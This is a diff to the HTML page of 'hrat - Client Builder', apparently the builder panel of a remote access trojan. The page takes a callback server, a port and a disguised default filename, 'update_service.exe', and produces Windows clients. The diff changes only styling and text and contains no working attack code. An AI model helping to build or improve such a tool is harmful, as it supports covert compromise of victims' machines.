@@ -1,11 +1,61 @@
 <!doctype html>
-<html lang="ru" class="dark">
+<html lang="en" class="dark">
     <head>
         <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <title>hrat - Client Builder</title>
         <script src="https://cdn.tailwindcss.com"></script>
         <script src="https://unpkg.com/htmx.org@1.9.10"></script>
         <style>
+            @import url("https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap");
+
+            body {
+                font-family:
+                    "Inter",
+                    -apple-system,
+                    BlinkMacSystemFont,
+                    "Segoe UI",
+                    Roboto,
+                    sans-serif;
+                background: linear-gradient(
+                    135deg,
+                    rgb(18, 18, 18) 0%,
+                    rgb(24, 24, 24) 100%
+                );
+                min-height: 100vh;
+            }
+
+            .glass-effect {
+                background: rgba(32, 32, 32, 0.8);
+                backdrop-filter: blur(20px);
+                border: 1px solid rgba(255, 255, 255, 0.1);
+            }
+
+            .button-primary {
+                background: linear-gradient(135deg, #ffffff 0%, #e5e7eb 100%);
+                color: #1f2937;
+                box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
+                transition: all 0.2s ease;
+            }
+
+            .button-primary:hover {
+                background: linear-gradient(135deg, #f3f4f6 0%, #d1d5db 100%);
+                box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+                transform: translateY(-1px);
+            }
+
+            .input-field {
+                background: rgba(24, 24, 24, 0.8);
+                border: 1px solid rgba(255, 255, 255, 0.1);
+                transition: all 0.2s ease;
+            }
+
+            .input-field:focus {
+                border-color: #d1d5db;
+                box-shadow: 0 0 0 3px rgba(209, 213, 219, 0.1);
+                outline: none;
+            }
+
             .htmx-indicator {
                 opacity: 0;
                 transition: opacity 200ms ease-in;
@@ -16,84 +66,194 @@
             .htmx-request.htmx-indicator {
                 opacity: 1;
             }
+
+            .build-result {
+                background: rgba(16, 16, 16, 0.8);
+                border: 1px solid rgba(255, 255, 255, 0.1);
+            }
+
+            .icon-background {
+                background: linear-gradient(
+                    135deg,
+                    rgba(255, 255, 255, 0.1) 0%,
+                    rgba(255, 255, 255, 0.05) 100%
+                );
+            }
         </style>
     </head>
-    <body class="bg-gray-900 text-gray-200 font-sans">
-        <div class="container mx-auto p-4 md:p-8">
-            <header class="mb-8">
-                <h1 class="text-4xl font-bold text-blue-400 mt-2">
+    <body class="text-white">
+        <div class="container mx-auto p-6 max-w-6xl">
+            <!-- Header -->
+            <div class="mb-8">
+                <h1
+                    class="text-5xl font-bold mb-2 bg-gradient-to-r from-white to-gray-300 bg-clip-text text-transparent"
+                >
                     Client Builder
                 </h1>
-                <p class="text-gray-400">Configure and build new client</p>
-            </header>
+                <p class="text-lg text-gray-400 font-light">
+                    Configure and build new clients for deployment
+                </p>
+            </div>
 
-            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
-                <div class="bg-gray-800 p-6 rounded-lg shadow-xl">
-                    <h2 class="text-2xl mb-4 font-semibold">
-                        Build Parameters
-                    </h2>
+            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+                <!-- Configuration Panel -->
+                <div class="glass-effect p-8 rounded-2xl shadow-2xl">
+                    <div class="flex items-center gap-3 mb-6">
+                        <div
+                            class="w-12 h-12 icon-background rounded-xl flex items-center justify-center"
+                        >
+                            <svg
+                                class="w-6 h-6 text-gray-300"
+                                fill="none"
+                                stroke="currentColor"
+                                viewBox="0 0 24 24"
+                            >
+                                <path
+                                    stroke-linecap="round"
+                                    stroke-linejoin="round"
+                                    stroke-width="2"
+                                    d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"
+                                ></path>
+                                <path
+                                    stroke-linecap="round"
+                                    stroke-linejoin="round"
+                                    stroke-width="2"
+                                    d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
+                                ></path>
+                            </svg>
+                        </div>
+                        <div>
+                            <h2 class="text-2xl font-semibold text-white">
+                                Build Configuration
+                            </h2>
+                            <p class="text-gray-400">
+                                Set up your client parameters
+                            </p>
+                        </div>
+                    </div>
 
                     <form
-                        hx-post="/build_client"
+                        hx-post="/builder/build_client"
                         hx-target="#build-result"
                         hx-swap="innerHTML"
                         hx-indicator="#build-spinner"
-                        class="space-y-4"
+                        class="space-y-6"
                     >
                         <div>
                             <label
                                 for="host_ip"
-                                class="block mb-2 text-sm font-medium"
-                                >IP or domain of host</label
+                                class="block text-sm font-semibold text-gray-300 mb-3"
                             >
+                                <span class="flex items-center gap-2">
+                                    <svg
+                                        class="w-4 h-4"
+                                        fill="none"
+                                        stroke="currentColor"
+                                        viewBox="0 0 24 24"
+                                    >
+                                        <path
+                                            stroke-linecap="round"
+                                            stroke-linejoin="round"
+                                            stroke-width="2"
+                                            d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9v-9m0-9v9"
+                                        ></path>
+                                    </svg>
+                                    Server IP or Domain
+                                </span>
+                            </label>
                             <input
                                 type="text"
                                 id="host_ip"
                                 name="host_ip"
                                 required
-                                class="w-full p-3 bg-gray-900 rounded border border-gray-600 focus:outline-none focus:border-blue-500"
-                                placeholder="123.45.67.89"
+                                class="input-field w-full p-4 rounded-xl text-white placeholder-gray-500"
+                                placeholder="e.g., 192.168.1.100"
                             />
                         </div>
 
                         <div>
                             <label
                                 for="port"
-                                class="block mb-2 text-sm font-medium"
-                                >Port</label
+                                class="block text-sm font-semibold text-gray-300 mb-3"
                             >
+                                <span class="flex items-center gap-2">
+                                    <svg
+                                        class="w-4 h-4"
+                                        fill="none"
+                                        stroke="currentColor"
+                                        viewBox="0 0 24 24"
+                                    >
+                                        <path
+                                            stroke-linecap="round"
+                                            stroke-linejoin="round"
+                                            stroke-width="2"
+                                            d="M8 11V7a4 4 0 118 0m-4 8v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2z"
+                                        ></path>
+                                    </svg>
+                                    Server Port
+                                </span>
+                            </label>
                             <input
                                 type="number"
                                 id="port"
                                 name="port"
                                 value="4040"
-                                class="w-full p-3 bg-gray-900 rounded border border-gray-600 focus:outline-none focus:border-blue-500"
+                                class="input-field w-full p-4 rounded-xl text-white placeholder-gray-500"
                             />
                         </div>
 
                         <div>
                             <label
                                 for="client_name"
-                                class="block mb-2 text-sm font-medium"
-                                >Filename</label
+                                class="block text-sm font-semibold text-gray-300 mb-3"
                             >
+                                <span class="flex items-center gap-2">
+                                    <svg
+                                        class="w-4 h-4"
+                                        fill="none"
+                                        stroke="currentColor"
+                                        viewBox="0 0 24 24"
+                                    >
+                                        <path
+                                            stroke-linecap="round"
+                                            stroke-linejoin="round"
+                                            stroke-width="2"
+                                            d="M7 21h10a2 2 0 002-2V9.414a1 1 0 00-.293-.707l-5.414-5.414A1 1 0 0012.586 3H7a2 2 0 00-2 2v14a2 2 0 002 2z"
+                                        ></path>
+                                    </svg>
+                                    Output Filename
+                                </span>
+                            </label>
                             <input
                                 type="text"
                                 id="client_name"
                                 name="client_name"
                                 value="update_service.exe"
-                                class="w-full p-3 bg-gray-900 rounded border border-gray-600 focus:outline-none focus:border-blue-500"
+                                class="input-field w-full p-4 rounded-xl text-white placeholder-gray-500"
                             />
                         </div>
 
                         <button
                             type="submit"
-                            class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded transition flex items-center justify-center"
+                            class="button-primary w-full py-4 rounded-xl font-semibold text-lg flex items-center justify-center gap-3"
                         >
-                            <span>Build Client</span>
+                            <svg
+                                class="w-5 h-5"
+                                fill="none"
+                                stroke="currentColor"
+                                viewBox="0 0 24 24"
+                            >
+                                <path
+                                    stroke-linecap="round"
+                                    stroke-linejoin="round"
+                                    stroke-width="2"
+                                    d="M19.428 15.428a2 2 0 00-1.022-.547l-2.387-.477a6 6 0 00-3.86.517l-.318.158a6 6 0 01-3.86.517L6.05 15.21a2 2 0 00-1.806.547M8 4h8l-1 1v5.172a2 2 0 00.586 1.414l5 5c1.26 1.26.367 3.414-1.415 3.414H4.828c-1.782 0-2.674-2.154-1.414-3.414l5-5A2 2 0 009 10.172V5L8 4z"
+                                ></path>
+                            </svg>
+                            Build Client
                             <svg
                                 id="build-spinner"
-                                class="htmx-indicator animate-spin ml-3 h-5 w-5 text-white"
+                                class="htmx-indicator animate-spin w-5 h-5"
                                 xmlns="http://www.w3.org/2000/svg"
                                 fill="none"
                                 viewBox="0 0 24 24"
@@ -116,15 +276,149 @@
                     </form>
                 </div>
 
-                <div
-                    id="build-result"
-                    class="bg-gray-800 p-6 rounded-lg shadow-xl"
-                >
-                    <div class="text-center text-gray-500">
-                        <p>
-                            Fill out the form and click build
-                            <br />
-                            Result will appear here
+                <!-- Build Result Panel -->
+                <div class="glass-effect p-8 rounded-2xl shadow-2xl">
+                    <div class="flex items-center gap-3 mb-6">
+                        <div
+                            class="w-12 h-12 icon-background rounded-xl flex items-center justify-center"
+                        >
+                            <svg
+                                class="w-6 h-6 text-gray-300"
+                                fill="none"
+                                stroke="currentColor"
+                                viewBox="0 0 24 24"
+                            >
+                                <path
+                                    stroke-linecap="round"
+                                    stroke-linejoin="round"
+                                    stroke-width="2"
+                                    d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"
+                                ></path>
+                            </svg>
+                        </div>
+                        <div>
+                            <h2 class="text-2xl font-semibold text-white">
+                                Build Output
+                            </h2>
+                            <p class="text-gray-400">
+                                Build results and download links
+                            </p>
+                        </div>
+                    </div>
+
+                    <div
+                        id="build-result"
+                        class="build-result rounded-xl p-6 min-h-[400px]"
+                    >
+                        <div class="flex items-center justify-center h-full">
+                            <div class="text-center">
+                                <svg
+                                    class="w-20 h-20 mx-auto mb-6 text-gray-600"
+                                    fill="none"
+                                    stroke="currentColor"
+                                    viewBox="0 0 24 24"
+                                >
+                                    <path
+                                        stroke-linecap="round"
+                                        stroke-linejoin="round"
+                                        stroke-width="1"
+                                        d="M12 4.354a4 4 0 110 5.292M15 21H3v-1a6 6 0 0112 0v1zm0 0h6v-1a6 6 0 00-9-5.197m13.5-9a2.5 2.5 0 11-5 0 2.5 2.5 0 015 0z"
+                                    ></path>
+                                </svg>
+                                <h3
+                                    class="text-2xl font-semibold text-gray-300 mb-2"
+                                >
+                                    Ready to Build
+                                </h3>
+                                <p class="text-gray-500 text-lg">
+                                    Fill out the configuration form and click
+                                    "Build Client"
+                                </p>
+                                <p class="text-gray-600 text-sm mt-2">
+                                    Build results will appear here
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Additional Info -->
+            <div class="glass-effect rounded-2xl p-6 mt-8 shadow-2xl">
+                <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                    <div class="text-center">
+                        <div
+                            class="w-12 h-12 bg-gray-700/30 rounded-xl flex items-center justify-center mx-auto mb-3"
+                        >
+                            <svg
+                                class="w-6 h-6 text-gray-400"
+                                fill="none"
+                                stroke="currentColor"
+                                viewBox="0 0 24 24"
+                            >
+                                <path
+                                    stroke-linecap="round"
+                                    stroke-linejoin="round"
+                                    stroke-width="2"
+                                    d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
+                                ></path>
+                            </svg>
+                        </div>
+                        <h4 class="text-lg font-semibold text-white mb-2">
+                            Cross-Platform
+                        </h4>
+                        <p class="text-gray-400 text-sm">
+                            Builds Windows executables from any platform
+                        </p>
+                    </div>
+                    <div class="text-center">
+                        <div
+                            class="w-12 h-12 bg-gray-700/30 rounded-xl flex items-center justify-center mx-auto mb-3"
+                        >
+                            <svg
+                                class="w-6 h-6 text-gray-400"
+                                fill="none"
+                                stroke="currentColor"
+                                viewBox="0 0 24 24"
+                            >
+                                <path
+                                    stroke-linecap="round"
+                                    stroke-linejoin="round"
+                                    stroke-width="2"
+                                    d="M13 10V3L4 14h7v7l9-11h-7z"
+                                ></path>
+                            </svg>
+                        </div>
+                        <h4 class="text-lg font-semibold text-white mb-2">
+                            Fast Build
+                        </h4>
+                        <p class="text-gray-400 text-sm">
+                            Optimized Rust compilation for quick deployment
+                        </p>
+                    </div>
+                    <div class="text-center">
+                        <div
+                            class="w-12 h-12 bg-gray-700/30 rounded-xl flex items-center justify-center mx-auto mb-3"
+                        >
+                            <svg
+                                class="w-6 h-6 text-gray-400"
+                                fill="none"
+                                stroke="currentColor"
+                                viewBox="0 0 24 24"
+                            >
+                                <path
+                                    stroke-linecap="round"
+                                    stroke-linejoin="round"
+                                    stroke-width="2"
+                                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
+                                ></path>
+                            </svg>
+                        </div>
+                        <h4 class="text-lg font-semibold text-white mb-2">
+                            Configurable
+                        </h4>
+                        <p class="text-gray-400 text-sm">
+                            Custom server endpoints and filenames
                         </p>
                     </div>
                 </div>
